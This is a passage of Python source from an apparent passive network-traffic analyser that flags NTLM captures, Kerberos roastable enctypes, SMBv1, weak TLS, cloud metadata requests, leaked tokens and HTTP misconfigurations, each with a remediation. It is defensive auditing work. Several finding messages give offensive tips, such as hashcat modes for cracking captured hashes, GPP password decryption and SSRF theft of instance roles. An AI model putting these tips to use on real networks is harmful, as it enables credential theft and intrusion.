                    f"NTLMSSP Type 3 captured — {domain}\\{username} ({'v2' if ntlmv2 else 'v1'})",
                    f"Auth response {src} → {dst}:{port}. Pair with the Type 2 server challenge "
                    f"(look in this same flow) to yield a hashcat-crackable hash. "
                    f"NTLMv1 = SMB relay + instantly crackable; NTLMv2 = offline crack with rockyou/rules.",
                    hosts=[src, dst], port=port,
                    evidence=f"{domain}\\{username} @ {workstation}",
                    remediation="Enforce SMB signing, disable NTLMv1, restrict NTLM via GPO, prefer Kerberos.",
                    key=("ntlm3", src, dst, username, domain))
                self._add_credential(src, dst, port,
                                     f"NTLMv{2 if ntlmv2 else 1}-Response",
                                     username=f"{domain}\\{username}",
                                     extra=f"workstation={workstation} nt={nt_resp.hex()[:48]}…")
            except Exception:
                pass
        elif mtype == 2 and idx + 32 <= len(payload):
            try:
                challenge = payload[idx + 24:idx + 32]
                info["challenge"] = challenge.hex()
                self._add_finding("high", "ntlm-capture",
                    "NTLMSSP Type 2 challenge issued",
                    f"Server {src}:{port} issued NTLM challenge {challenge.hex()}. Combined with "
                    f"a Type 3 response this yields a crackable hash.",
                    hosts=[src, dst], port=port, evidence=challenge.hex(),
                    remediation="See NTLMSSP Type 3 finding.",
                    key=("ntlm2", src, dst, challenge.hex()))
            except Exception:
                pass
        self.ntlm_messages.append(info)

    def _d_kerberos(self, src, dst, port, payload):
        # ASN.1 tag [0] INTEGER for enctype: a0 03 02 01 XX. 0x01/0x03=DES, 0x17=RC4 — all roastable.
        weak_enctypes = {0x17: "RC4-HMAC", 0x01: "DES-CBC-CRC", 0x03: "DES-CBC-MD5"}
        for m in re.finditer(rb"\xa0\x03\x02\x01([\x01\x03\x17])", payload):
            et = m.group(1)[0]
            name = weak_enctypes.get(et, f"etype={et}")
            sev = "critical" if et in (0x01, 0x03) else "high"
            self._add_finding(sev, "kerberos-weak",
                f"Kerberos weak enctype: {name}",
                f"Kerberos traffic {src} ↔ {dst}:{port} advertises or uses {name}. "
                f"RC4 tickets enable Kerberoasting and AS-REP roasting: extract with tshark/krbjack "
                f"and crack offline with hashcat mode 13100 / 18200.",
                hosts=[src, dst], port=port, evidence=name,
                remediation="Set 'This account supports only Kerberos AES' on service accounts; disable RC4 via GPO.",
                key=("krb-weak", src, dst, et))
        # ASN.1 [APPLICATION 11] = 0x6B marks an AS-REP — roastable if pre-auth was disabled.
        if b"\x6b\x81" in payload[:16] or b"\x6b\x82" in payload[:16]:
            self._add_finding("medium", "kerberos-weak",
                "Kerberos AS-REP observed",
                f"AS-REP from {src} to {dst}. If a user has 'Do not require Kerberos pre-auth' set, "
                f"the encrypted portion is AS-REP-roastable (hashcat 18200).",
                hosts=[src, dst], port=port,
                remediation="Audit userAccountControl for DONT_REQ_PREAUTH flag.",
                key=("asrep", src, dst))

    def _d_smb(self, src, dst, port, payload):
        if port not in (139, 445):
            return
        if b"\xffSMB" in payload[:8] or b"\xffSMB" in payload[4:16]:
            self.smb1_flows.add((src, dst))
            self._add_finding("critical", "smb",
                "SMBv1 traffic observed",
                f"SMB1 in use between {src} and {dst}:{port}. SMB1 is deprecated and ships "
                f"MS17-010 (EternalBlue) vulnerability class; also vulnerable to downgrade-and-relay.",
                hosts=[src, dst], port=port,
                remediation="Disable SMB1 everywhere (Remove-WindowsFeature FS-SMB1 / reg smb1 0).",
                key=("smb1", src, dst))
        elif b"\xfeSMB" in payload[:8] or b"\xfeSMB" in payload[4:16]:
            self._add_finding("info", "smb",
                "SMB2/3 traffic observed",
                f"SMB2/3 between {src} and {dst}:{port}. Verify message signing is REQUIRED "
                f"(not just enabled) — unsigned SMB is the classic ntlmrelayx target.",
                hosts=[src, dst], port=port,
                remediation="RequireSecuritySignature=1 via GPO on both client and server.",
                key=("smb2", src, dst))

    def _d_tls(self, src, dst, port, payload):
        if len(payload) < 11:
            return
        # TLS record: [0]=0x16 handshake, [5]=0x01 ClientHello, [9:11]=client_version.
        if payload[0] != 0x16 or payload[5] != 0x01:
            return
        client_ver = (payload[9], payload[10])
        version_map = {(3, 0): "SSLv3", (3, 1): "TLS 1.0", (3, 2): "TLS 1.1",
                       (3, 3): "TLS 1.2", (3, 4): "TLS 1.3"}
        vname = version_map.get(client_ver, f"unknown ({client_ver})")
        if client_ver in ((3, 0), (3, 1), (3, 2)):
            self.weak_tls_flows.add((src, dst, port))
            self._add_finding("high", "tls-weak",
                f"Weak TLS ClientHello: {vname}",
                f"Client {src} advertised {vname} to {dst}:{port}. Vulnerable to POODLE (SSLv3) / "
                f"BEAST (TLS 1.0); fails PCI DSS 3.2. May allow downgrade-and-MITM.",
                hosts=[src, dst], port=port, evidence=vname,
                remediation="Disable TLS < 1.2 on server; require TLS 1.2+ on clients.",
                key=("tls-weak", src, dst, port, vname))
        try:
            sni = self._extract_sni(payload)
            if sni:
                self._add_sni(src, dst, port, sni)
        except Exception:
            pass
        try:
            weak = self._extract_weak_cipher_suites(payload)
            if weak:
                self._add_finding("high", "tls-weak",
                    f"Weak TLS cipher suites offered ({len(weak)})",
                    f"{src} → {dst}:{port} ClientHello advertises weak cipher suites: "
                    f"{', '.join(sorted(set(weak))[:6])}. These cover RC4, DES, 3DES, EXPORT, NULL, anonymous DH.",
                    hosts=[src, dst], port=port, evidence=", ".join(sorted(set(weak))[:12]),
                    remediation="Disable RC4/DES/3DES/EXPORT/NULL/anon on both ends; prefer AES-GCM + ECDHE.",
                    key=("tls-weak-cipher", src, dst, port))
        except Exception:
            pass

    @staticmethod
    def _extract_weak_cipher_suites(payload):
        if len(payload) < 44 or payload[0] != 0x16 or payload[5] != 0x01:
            return []
        try:
            pos = 43
            sid_len = payload[pos]; pos += 1 + sid_len
            cs_len = struct.unpack_from(">H", payload, pos)[0]; pos += 2
            if pos + cs_len > len(payload) or cs_len <= 0 or cs_len > 4000:
                return []
            suites = struct.unpack_from(f">{cs_len // 2}H", payload, pos)
            return [WEAK_TLS_CIPHER_SUITES[s] for s in suites if s in WEAK_TLS_CIPHER_SUITES]
        except Exception:
            return []

    @staticmethod
    def _extract_sni(payload):
        if len(payload) < 43 or payload[0] != 0x16 or payload[5] != 0x01:
            return None
        pos = 43
        try:
            sid_len = payload[pos]; pos += 1 + sid_len
            cs_len = struct.unpack_from(">H", payload, pos)[0]; pos += 2 + cs_len
            cm_len = payload[pos]; pos += 1 + cm_len
            ext_total = struct.unpack_from(">H", payload, pos)[0]; pos += 2
            end = pos + ext_total
            while pos + 4 <= end:
                et, el = struct.unpack_from(">HH", payload, pos); pos += 4
                if et == 0x00 and el >= 5:
                    _list_len, name_type, name_len = struct.unpack_from(">HBH", payload, pos)
                    return payload[pos + 5:pos + 5 + name_len].decode("ascii", errors="replace")
                pos += el
        except Exception:
            return None
        return None

    def _d_tftp(self, src, dst):
        self._add_finding("high", "plaintext-protocol",
            "TFTP traffic observed",
            f"TFTP between {src} and {dst}:69 transfers files with no auth or encryption. "
            f"Commonly used for router/switch configs — grab them directly.",
            hosts=[src, dst], port=69,
            remediation="Replace TFTP with SCP/SFTP; block port 69 at firewall.",
            key=("tftp", src, dst))

    def _d_ntp_mon(self, src, dst, payload):
        # Mode-7 monlist signature: v2+mode7 (0x17), impl 0 (0x00), REQ_MON_GETLIST (0x2a).
        if len(payload) >= 4 and payload[0] == 0x17 and payload[1] == 0x00 and payload[3] == 0x2a:
            self._add_finding("medium", "amplification",
                "NTP monlist query (amplification-capable)",
                f"Classic monlist mode-7 request {src} → {dst}:123. If server responds, it can "
                f"be used in DDoS reflection (~500x amp).",
                hosts=[src, dst], port=123,
                remediation="Upgrade ntpd; set `disable monitor`; rate-limit mode-7.",
                key=("ntp-mon", dst))

    def _d_cisco_smi(self, src, dst):
        self._add_finding("high", "network-device",
            "Cisco Smart Install traffic (TCP/4786)",
            f"Smart Install between {src} and {dst}:4786. Frequently exposed with no auth; "
            f"attackers pull running-config or push backdoored images (SIET / CVE-2018-0171).",
            hosts=[src, dst], port=4786,
            remediation="`no vstack` on switches; block 4786 at perimeter.",
            key=("smi", src, dst))

    def _d_ldap_bind(self, src, dst, payload):
        # bindRequest SEQ (0x30) + [APPLICATION 0] (0x60) + simple-auth context tag (0x80)
        # = plaintext password in the bind. Password length 0 = anonymous bind.
        if len(payload) < 14 or payload[0] != 0x30:
            return
        if b"\x60" not in payload[:14]:
            return
        if b"\x80" not in payload[:120]:
            return
        anon = b"\x80\x00" in payload[:120]
        if anon:
            self._add_finding("medium", "weak-auth",
                "LDAP anonymous bind",
                f"LDAP bindRequest {src} → {dst}:389 with empty simple password. "
                f"Anonymous binds can enumerate the directory (users, groups, OUs).",
                hosts=[src, dst], port=389,
                remediation="Disable anonymous LDAP bind (dsHeuristics on AD, 'disableAnonAccess').",
                key=("ldap-anon", src, dst))
        else:
            self._add_finding("high", "plaintext-protocol",
                "Cleartext LDAP simple-bind",
                f"LDAP bindRequest with simple (password) auth {src} → {dst}:389 without TLS. "
                f"Credentials travel in cleartext.",
                hosts=[src, dst], port=389,
                remediation="Require LDAPS (636) or STARTTLS on LDAP; disable simple binds without TLS.",
                key=("ldap-simple", src, dst))

    def _d_suspicious_port(self, src, dst, dport):
        if dport in SUSPICIOUS_CLIENT_PORTS:
            label = SUSPICIOUS_CLIENT_PORTS[dport]
            self._add_finding("high", "suspicious-traffic",
                f"Traffic to suspicious port {dport} ({label})",
                f"{src} → {dst}:{dport}. Common C2/backdoor default port — investigate the process on {src}.",
                hosts=[src, dst], port=dport,
                remediation="Identify the process; block outbound to known bad ports; EDR scan.",
                key=("susp-port", src, dst, dport))

    def _d_ics(self, src, dst, dport):
        if dport in ICS_PORTS:
            name, desc = ICS_PORTS[dport]
            self._add_finding("high", "ics-ot",
                f"{name} on :{dport}",
                f"Industrial control / OT protocol detected: {desc}. {src} → {dst}:{dport}. "
                f"Most ICS protocols have no authentication and grant full read/write.",
                hosts=[src, dst], port=dport,
                remediation="Segment OT from IT; block at perimeter; deploy ICS-aware IDS (Nozomi/Claroty).",
                key=("ics", dst, dport))

    def _d_insecure_mgmt(self, src, dst, dport):
        if dport in INSECURE_MANAGEMENT_PORTS:
            name, desc = INSECURE_MANAGEMENT_PORTS[dport]
            self._add_finding("high", "exposed-service",
                f"{name} on :{dport} — {desc}",
                f"{src} → {dst}:{dport}. Management/admin surface that is frequently left unauthenticated.",
                hosts=[src, dst], port=dport,
                remediation="Restrict to a management VLAN; require client certs; audit for default creds.",
                key=("insec-mgmt", dst, dport))

    def _d_http_payload(self, src, dst, port, text):
        self._d_cloud_secrets(src, dst, port, text)
        self._d_imds(src, dst, port, text)
        self._d_k8s_sa_token(src, dst, port, text)
        self._d_aws_sigv4(src, dst, port, text)
        self._d_graphql_introspection(src, dst, port, text)
        self._d_oauth_leak(src, dst, port, text)
        host_m = re.search(r"(?i)Host:\s*([^\r\n:]+)", text)
        if host_m:
            self._d_cloud_host(src, dst, port, host_m.group(1).strip())
        for regex, title, sev, cat, remed in WEB_ATTACK_PATTERNS:
            m = regex.search(text)
            if not m:
                continue
            self._add_finding(sev, f"web-attack",
                title,
                f"HTTP payload {src} → {dst}:{port} matches {cat} signature: {m.group(0)[:120]}",
                hosts=[src, dst], port=port,
                evidence=m.group(0)[:200],
                remediation=remed,
                key=(cat, src, dst))
        ua_m = re.search(r"User-Agent:\s*([^\r\n]+)", text, re.IGNORECASE)
        if ua_m:
            ua = ua_m.group(1)
            low = ua.lower()
            for sig, tool in SCANNER_USER_AGENTS.items():
                if sig in low:
                    self._add_finding("high", "scanner",
                        f"Security scanner detected: {tool}",
                        f"{src} made HTTP requests to {dst}:{port} with User-Agent advertising '{tool}'. "
                        f"Automated scanning / attack tool.",
                        hosts=[src, dst], port=port, evidence=ua[:160],
                        remediation="Confirm authorization; block offender at WAF if unsanctioned; review logs for findings.",
                        key=("scanner-ua", src, dst, sig))
                    break
        srv_m = re.search(r"Server:\s*([^\r\n]+)", text, re.IGNORECASE)
        if srv_m:
            srv = srv_m.group(1).strip()
            self._add_finding("info", "banner",
                f"HTTP Server header: {srv[:60]}",
                f"{dst}:{port} discloses Server: '{srv}'. Useful for targeted CVE lookup.",
                hosts=[dst], port=port, evidence=srv[:160],
                remediation="ServerTokens Prod / server_tokens off / remove X-Powered-By.",
                key=("http-server", dst, srv[:80]))
        path_m = re.match(r"(?:GET|POST|PUT|DELETE|HEAD) (\S+)", text)
        if path_m:
            path = path_m.group(1)
            for adm in ("/admin", "/wp-admin", "/phpmyadmin", "/manager/html",
                        "/console", "/solr/", "/actuator", "/.git/", "/.env",
                        "/server-status", "/server-info"):
                if path.startswith(adm) or adm.rstrip("/") == path:
                    self._add_finding("medium", "exposed-admin",
                        f"Request to admin path {adm}",
                        f"{src} → {dst}:{port} hit '{path}'. Common admin/diagnostic path — if reachable from untrusted networks it's low-hanging fruit.",
                        hosts=[src, dst], port=port, evidence=path[:200],
                        remediation="Restrict admin paths by IP or VPN; remove diagnostic endpoints from prod.",
                        key=("adm-path", dst, adm))
                    break

    def _d_dns_query_vuln(self, qname, qtype, src):
        if qtype in (251, 252):
            kind = "AXFR" if qtype == 252 else "IXFR"
            self._add_finding("high", "dns-vuln",
                f"DNS {kind} zone transfer requested",
                f"{src} asked for a {kind} transfer of '{qname}'. If the server allows it (misconfigured NS), "
                f"the attacker pulls every record in the zone — full internal host enumeration.",
                hosts=[src], port=53, evidence=f"{kind} {qname}",
                remediation="`allow-transfer { trusted-slaves; };` — never ANY; verify with `dig AXFR @ns zone`.",
                key=("axfr", src, qname))
        elif qtype == 255:
            self._add_finding("low", "dns-vuln",
                "DNS ANY query (amplification / recon)",
                f"{src} queried type ANY for '{qname}'. Classic open-resolver amplification probe or recursive recon.",
                hosts=[src], port=53, evidence=qname,
                remediation="Disable recursion for external clients; rate-limit ANY responses (RRL).",
                key=("dns-any", src))

    def _d_banner(self, src, dst, port, payload):
        if not payload:
            return
        try:
            head = payload[:256].decode("latin1", errors="replace")
        except Exception:
            return
        first_line = head.split("\n", 1)[0].strip()
        if port == 21 and first_line.startswith("220 "):
            self._add_finding("info", "banner",
                f"FTP banner: {first_line[:80]}",
                f"{dst}:21 advertised FTP banner '{first_line}'. Version disclosure aids CVE targeting.",
                hosts=[dst], port=21, evidence=first_line[:160],
                remediation="Mask banner (proftpd DeferWelcome, vsftpd ftpd_banner).",
                key=("ftp-banner", dst))
            low = first_line.lower()
            if "vsftpd 2.3.4" in low:
                self._add_finding("critical", "vuln-version",
                    "vsftpd 2.3.4 (backdoor, CVE-2011-2523)",
                    f"{dst} runs vsftpd 2.3.4 — shipped with a :) → bind-shell backdoor on TCP/6200.",
                    hosts=[dst], port=21, evidence=first_line[:160],
                    remediation="Upgrade immediately; investigate host for compromise.",
                    key=("vsftpd234", dst))
            if re.search(r"proftpd\s+1\.3\.[0-5]\b", low):
                self._add_finding("high", "vuln-version",
                    f"Old ProFTPd detected",
                    f"{dst} runs '{first_line}' — ProFTPd ≤1.3.5 has multiple RCE/info-leak CVEs (e.g. Mod Copy CVE-2015-3306).",
                    hosts=[dst], port=21, evidence=first_line[:160],
                    remediation="Upgrade ProFTPd; disable mod_copy if unused.",
                    key=("old-proftpd", dst))
        elif port in (22, 2222) and first_line.startswith("SSH-"):
            self._add_finding("info", "banner",
                f"SSH banner: {first_line[:80]}",
                f"{dst}:{port} advertised SSH banner '{first_line}'.",
                hosts=[dst], port=port, evidence=first_line[:160],
                remediation="Mostly cosmetic; attackers will fingerprint regardless.",
                key=("ssh-banner", dst, first_line[:60]))
            m = re.match(r"SSH-2\.0-OpenSSH_(\d+)\.(\d+)", first_line)
            if m:
                major, minor = int(m.group(1)), int(m.group(2))
                if (major, minor) < (7, 4):
                    self._add_finding("medium", "vuln-version",
                        f"Old OpenSSH {major}.{minor}",
                        f"{dst} runs OpenSSH {major}.{minor} — predates 7.4, multiple user-enum (CVE-2018-15473), "
                        f"auth-bypass, and DoS CVEs apply.",
                        hosts=[dst], port=port, evidence=first_line[:160],
                        remediation="Upgrade to current OpenSSH.",
                        key=("old-ssh", dst))
            if first_line.startswith("SSH-1."):
                self._add_finding("critical", "vuln-version",
                    "SSHv1 protocol advertised",
                    f"{dst}:{port} speaks SSHv1 — deprecated, weak MAC, multiple exploitable CVEs.",
                    hosts=[dst], port=port, evidence=first_line[:160],
                    remediation="Disable Protocol 1 in sshd_config.",
                    key=("ssh1", dst))
        elif port == 25 and first_line.startswith("220 "):
            self._add_finding("info", "banner",
                f"SMTP banner: {first_line[:80]}",
                f"{dst}:25 banner discloses server software.",
                hosts=[dst], port=25, evidence=first_line[:160],
                remediation="Mask or sanitize banner.",
                key=("smtp-banner", dst))
        elif port == 3306 and payload and len(payload) > 5:
            # MySQL handshake v10 starts with 0x0a after 4-byte length+seq header.
            if payload[4:5] == b"\x0a":
                try:
                    end = payload.index(b"\x00", 5)
                    ver = payload[5:end].decode("latin1", errors="replace")
                    self._add_finding("info", "banner",
                        f"MySQL server version: {ver}",
                        f"{dst}:3306 handshake exposed server version '{ver}'.",
                        hosts=[dst], port=3306, evidence=ver[:120],
                        remediation="Place MySQL behind VPN/private subnet only.",
                        key=("mysql-ver", dst))
                except ValueError:
                    pass

    def _d_irc_c2(self, src, dst, port, payload):
        if len(payload) < 6 or payload[0] > 0x7f:
            return
        try:
            text = payload[:512].decode("utf-8", errors="replace")
        except Exception:
            return
        if not re.search(r"(?m)^(NICK|JOIN|PRIVMSG|USER|PING|PONG)\s+\S", text):
            return
        sev = "medium" if port in (6667, 6697) else "high"
        self._add_finding(sev, "suspicious-traffic",
            f"IRC protocol on :{port}{' (non-standard)' if port not in (6667, 6697) else ''}",
            f"{src} → {dst}:{port} carries IRC commands. IRC is a common botnet C2 channel; on non-standard "
            f"ports it is a strong C2 indicator.",
            hosts=[src, dst], port=port,
            evidence=text[:160].replace("\r", "\\r").replace("\n", "\\n"),
            remediation="Block IRC egress if unused; inspect {src} for malware.",
            key=("irc", src, dst, port))

    def _d_gpp_cpassword(self, src, dst, payload):
        m = GPP_CPASSWORD_RE.search(payload)
        if not m:
            return
        cpw = m.group(1).decode("ascii", errors="replace")
        self._add_finding("critical", "ad-weakness",
            "GPP cpassword exposed in SMB traffic",
            f"A Group Policy Preferences XML containing cpassword='{cpw[:32]}…' was transferred "
            f"{src} → {dst}. GPP uses a publicly-known AES key (MS14-025) — decrypt instantly with "
            f"`gpp-decrypt` / `Get-GPPPassword`.",
            hosts=[src, dst], evidence=cpw[:120],
            remediation="Remove all cpassword= entries from SYSVOL; rotate any credentials they held; install KB2962486.",
            key=("gpp-cpassword", dst))

    def _d_cloud_host(self, src, dst, port, hostname):
        if not hostname:
            return
        for regex, provider, service, note in CLOUD_HOST_PATTERNS:
            if regex.search(hostname):
                sev = "high" if service in ("IMDS", "SecretsMgr", "KeyVault", "IAM", "STS") else "info"
                self._add_finding(sev, f"cloud-{provider.lower()}",
                    f"{provider} {service} traffic — {hostname}",
                    f"{src} → {dst}:{port} connected to a {provider} {service} endpoint. {note}",
                    hosts=[src, dst], port=port, evidence=hostname,
                    remediation=f"Ensure access is authorized and the data plane is encrypted end-to-end.",
                    key=(f"cloud-{provider.lower()}", service, hostname))
                break

    def _d_cloud_secrets(self, src, dst, port, text):
        if not text:
            return
        for regex, label, sev, cat, rem in SECRET_PATTERNS:
            if isinstance(regex.pattern, bytes):
                continue
            for m in regex.finditer(text):
                snippet = m.group(0)
                redacted = snippet[:8] + "…" + snippet[-4:] if len(snippet) > 16 else snippet
                self._add_finding(sev, f"secret-leak",
                    f"{label} leaked in plaintext HTTP",
                    f"{src} → {dst}:{port} transmitted material matching a {label} signature: {redacted}",
                    hosts=[src, dst], port=port, evidence=redacted,
                    remediation=rem,
                    key=(cat, snippet[:48]))

    def _d_binary_secrets(self, src, dst, port, payload):
        for regex, label, sev, cat, rem in SECRET_PATTERNS:
            if not isinstance(regex.pattern, bytes):
                continue
            for m in regex.finditer(payload):
                snippet = m.group(0).decode("latin1", errors="replace")
                redacted = snippet[:8] + "…" + snippet[-4:] if len(snippet) > 16 else snippet
                self._add_finding(sev, "secret-leak",
                    f"{label} leaked in plaintext",
                    f"{src} → {dst}:{port} transmitted material matching a {label} signature.",
                    hosts=[src, dst], port=port, evidence=redacted,
                    remediation=rem,
                    key=(cat, snippet[:64]))

    def _d_imds(self, src, dst, port, text):
        if "169.254.169.254" not in text and "metadata.google.internal" not in text \
                and "/latest/meta-data" not in text and "/metadata/instance" not in text:
            return
        has_token = re.search(r"(?i)X-aws-ec2-metadata-token:", text) is not None
        has_flavor = re.search(r"(?i)Metadata-Flavor:\s*Google", text) is not None
        has_api_version = re.search(r"(?i)Metadata:\s*true", text) is not None
        request_line = (text.split("\r\n", 1)[0] or "")[:160]
        if "/latest/meta-data" in text or "169.254.169.254" in text:
            if has_token:
                self._add_finding("info", "cloud-aws",
                    "AWS IMDSv2 request (token-authenticated)",
                    f"{src} → {dst}:{port} queried AWS IMDS with a session token header. "
                    f"IMDSv2 is the hardened flow; ensure IMDSv1 is fully disabled.",
                    hosts=[src, dst], port=port, evidence=request_line,
                    remediation="Enforce `HttpTokens=required` on all EC2 instances.",
                    key=("imdsv2", src, dst))
            else:
                self._add_finding("high", "cloud-aws",
                    "AWS IMDSv1 request (no token header)",
                    f"{src} → {dst}:{port} queried AWS IMDS without `X-aws-ec2-metadata-token`. "
                    f"IMDSv1 is SSRF-reachable — an app-layer SSRF steals the instance IAM role.",
                    hosts=[src, dst], port=port, evidence=request_line,
                    remediation="Enforce IMDSv2 (`HttpTokens=required`, hop limit 1) on every EC2 instance.",
                    key=("imdsv1", src, dst))
        if "metadata.google.internal" in text and not has_flavor:
            self._add_finding("medium", "cloud-gcp",
                "GCP IMDS request without Metadata-Flavor header",
                f"{src} → {dst}:{port} queried GCP metadata without the required "
                f"`Metadata-Flavor: Google` header — likely won't be served, but "
                f"indicates probe behavior.",
                hosts=[src, dst], port=port, evidence=request_line,
                remediation="Detect and block unauthorized /metadata access from app subnets.",
                key=("gcp-imds-probe", src))
        if "/metadata/instance" in text and not has_api_version:
            self._add_finding("medium", "cloud-azure",
                "Azure IMDS request without Metadata:true header",
                f"{src} → {dst}:{port} queried Azure IMDS without the required "
                f"`Metadata: true` header — probe.",
                hosts=[src, dst], port=port, evidence=request_line,
                remediation="Azure IMDS refuses requests without the Metadata header; monitor egress to 169.254.169.254 from app pools.",
                key=("azure-imds-probe", src))

    def _d_k8s_sa_token(self, src, dst, port, text):
        for m in re.finditer(r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.(eyJ[A-Za-z0-9_-]{10,})\.[A-Za-z0-9_-]{4,}", text):
            body_b64 = m.group(1)
            padded = body_b64 + "=" * ((4 - len(body_b64) % 4) % 4)
            try:
                body = base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace")
            except Exception:
                continue
            if "system:serviceaccount" in body or "kubernetes.io/serviceaccount" in body:
                try:
                    claims = json.loads(body)
                except Exception:
                    claims = {}
                sa = (claims.get("kubernetes.io/serviceaccount/service-account.name")
                      or claims.get("sub") or "unknown")
                ns = claims.get("kubernetes.io/serviceaccount/namespace", "default")
                self._add_finding("critical", "cloud-k8s",
                    f"Kubernetes service-account JWT leaked — {ns}/{sa}",
                    f"{src} → {dst}:{port} transmitted a Kubernetes service-account token in plain HTTP. "
                    f"The token is presentable to the kube-apiserver for whatever RBAC the SA has.",
                    hosts=[src, dst], port=port, evidence=f"{ns}/{sa}",
                    remediation="Rotate the SA secret; audit RBAC for the account; don't expose kube-apiserver over plain HTTP.",
                    key=("k8s-sa-jwt", ns, sa))
                return
        # JWT alg=none check
        for m in re.finditer(r"(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{10,})\.(eyJ[A-Za-z0-9_-]{10,})\.([A-Za-z0-9_-]{0,})", text):
            header_b64 = m.group(1)
            padded = header_b64 + "=" * ((4 - len(header_b64) % 4) % 4)
            try:
                header = json.loads(base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))
            except Exception:
                continue
            alg = (header.get("alg") or "").lower()
            if alg == "none":
                self._add_finding("critical", "jwt-weak",
                    "JWT with alg=none",
                    f"{src} → {dst}:{port} transmitted a JWT with alg=none — signature unchecked, trivial to forge.",
                    hosts=[src, dst], port=port, evidence=m.group(0)[:80],
                    remediation="Reject alg=none at the verifier; whitelist expected algorithms.",
                    key=("jwt-none", src, dst))
            elif alg in ("hs256", "hs384", "hs512") and len(m.group(3)) < 20:
                self._add_finding("medium", "jwt-weak",
                    f"JWT with HMAC alg ({alg}) — crackable if secret is weak",
                    f"{src} → {dst}:{port} carries an HMAC-signed JWT. Short/weak secrets crack offline in seconds.",
                    hosts=[src, dst], port=port, evidence=m.group(0)[:80],
                    remediation="Use 32+ byte random signing keys; consider switching to RS256/EdDSA.",
                    key=("jwt-hs", src, dst))

    def _d_aws_sigv4(self, src, dst, port, text):
        m = re.search(r"(?i)Authorization:\s*AWS4-HMAC-SHA256\s+Credential=([^/\s,]+)/", text)
        if m:
            key_id = m.group(1)
            self._add_finding("info", "cloud-aws",
                f"AWS Sigv4 signed request (key id {key_id[:8]}…)",
                f"{src} → {dst}:{port} is an AWS API call signed with access key {key_id[:8]}…. "
                f"Useful for attributing cloud traffic to a principal.",
                hosts=[src, dst], port=port, evidence=key_id,
                remediation="Verify the key id against expected IAM principals; rotate stale keys.",
                key=("aws-sigv4", src, key_id))

    def _d_graphql_introspection(self, src, dst, port, text):
        if re.search(r"(?i)(?:query\s*=|\"query\"\s*:)\s*[^\r\n]*__schema", text):
            self._add_finding("medium", "web-recon",
                "GraphQL introspection query",
                f"{src} → {dst}:{port} issued a GraphQL introspection (__schema). "
                f"This returns the full API surface to any caller — recon goldmine.",
                hosts=[src, dst], port=port,
                remediation="Disable introspection in production; require auth for schema access.",
                key=("graphql-introspect", src, dst))

    def _d_oauth_leak(self, src, dst, port, text):
        # OAuth code/token in URL query strings — if it hits a logged URL they often
        # end up in referrer headers / access logs.
        if re.search(r"[?&](?:code|id_token|access_token)=[A-Za-z0-9._-]{16,}", text):
            self._add_finding("medium", "web-hardening",
                "OAuth code/token in URL query string",
                f"{src} → {dst}:{port} contains an OAuth code/token in the URL. "
                f"URLs leak via referer headers, proxy logs, and browser history.",
                hosts=[src, dst], port=port,
                remediation="Use form_post response_mode; move tokens to Authorization header.",
                key=("oauth-url-token", src, dst))

    def _d_http_response(self, src, dst, port, text):
        if not text.startswith("HTTP/"):
            return
        head = text.split("\r\n\r\n", 1)[0]
        low = head.lower()
        missing = []
        for h in ("x-frame-options", "content-security-policy",
                  "strict-transport-security", "x-content-type-options"):
            if h not in low:
                missing.append(h)
        if missing:
            self._add_finding("low", "http-hardening",
                f"HTTP response missing {len(missing)} security header(s)",
                f"Response from {src}:{port} lacks: {', '.join(missing)}.",
                hosts=[src], port=port, evidence=", ".join(missing),
                remediation="Add missing headers at reverse proxy / app (HSTS, CSP, XFO, XCTO).",
                key=("hdr-missing", src, port, tuple(missing)))
        for m in re.finditer(r"(?i)Set-Cookie:\s*([^=]+)=([^;\r\n]+)(?:;([^\r\n]*))?", text):
            name = m.group(1).strip()
            flags = (m.group(3) or "").lower()
            is_session_like = re.search(r"(?i)(sess|auth|token|login|sid|jsessionid|phpsessid)", name)
            if "secure" not in flags:
                sev = "high" if is_session_like else "medium"
                self._add_finding(sev, "http-hardening",
                    f"Set-Cookie '{name}' without Secure",
                    f"{src}:{port} set cookie '{name}' without Secure flag — leaks over plaintext HTTP.",
                    hosts=[src], port=port, evidence=name[:80],
                    remediation="Always set `Secure; HttpOnly; SameSite=Lax` on auth/session cookies.",
                    key=("cookie-insec", src, name[:64]))
            elif "httponly" not in flags and is_session_like:
                self._add_finding("medium", "http-hardening",
                    f"Session cookie '{name}' without HttpOnly",
                    f"{src}:{port} set session cookie '{name}' without HttpOnly — readable from JS (XSS amplifier).",
                    hosts=[src], port=port, evidence=name[:80],
                    remediation="Add HttpOnly to all session cookies.",
                    key=("cookie-nohttp", src, name[:64]))
        if re.search(r"(?i)Access-Control-Allow-Origin:\s*\*", head):
            if re.search(r"(?i)Access-Control-Allow-Credentials:\s*true", head):
                self._add_finding("high", "http-hardening",
                    "CORS wildcard with credentials=true",
                    f"{src}:{port} returns `Access-Control-Allow-Origin: *` alongside "
                    f"`Access-Control-Allow-Credentials: true`. Browsers reject the combo, but this "
                    f"signals server misconfiguration frequently paired with reflected-origin bypasses.",
                    hosts=[src], port=port,
                    remediation="Never combine wildcard origin with credentials; allowlist explicit origins.",
                    key=("cors-wild-cred", src, port))
            else:
                self._add_finding("low", "http-hardening",
                    "CORS wildcard origin",
                    f"{src}:{port} allows any origin for responses.",
                    hosts=[src], port=port,
                    remediation="Restrict ACAO to explicit origins.",
                    key=("cors-wild", src, port))
        for h in ("X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "X-Generator"):
            m2 = re.search(rf"(?i){h}:\s*([^\r\n]+)", head)
            if m2:
                val = m2.group(1).strip()
                self._add_finding("info", "banner",
                    f"{h} header: {val[:60]}",
                    f"{src}:{port} discloses tech stack via {h}: '{val}'.",
                    hosts=[src], port=port, evidence=val[:160],
                    remediation=f"Remove the {h} header at the reverse proxy.",
                    key=(f"hdr-{h.lower()}", src, val[:80]))

    def _d_ssdp(self, src, dst, payload):
        if not payload:
            return
        if payload.startswith(b"M-SEARCH ") or b"\r\nST:" in payload[:400]:
            self._add_finding("low", "iot",
                "SSDP M-SEARCH (UPnP discovery)",
                f"{src} sent SSDP M-SEARCH to {dst}:1900. UPnP devices respond with service "
                f"description URLs — useful for device enumeration and UPnP vuln hunting.",
                hosts=[src], port=1900,
                remediation="Disable UPnP on consumer gear; block SSDP at perimeter.",
                key=("ssdp", src))
        # Any SSDP message from a device — capture its Server: header for identity.
        try:
